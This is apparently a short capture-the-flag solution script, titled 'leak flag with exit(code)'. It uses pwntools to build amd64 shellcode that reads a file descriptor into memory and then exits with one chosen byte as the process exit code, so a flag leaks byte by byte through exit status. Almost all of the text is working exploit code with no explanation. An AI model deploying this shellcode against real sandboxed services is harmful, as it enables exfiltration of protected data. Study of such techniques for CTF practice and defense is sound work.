leak flag with exit(code)
```
from pwn import *
import sys
i = int(sys.argv[1])
context(log_level = 'info', arch = 'amd64', os = 'linux')
shellcode=shellcraft.read(3, 0x1337100, 0x100)
#shellcode+=shellcraft.exit([0x1337000])
shellcode=asm(shellcode)
abc=asm('''
        mov rdi, [0x1337100+%d]
        mov rax, 60
        syscall
        '''%i)
sys.stdout.buffer.write(shellcode+abc)
```
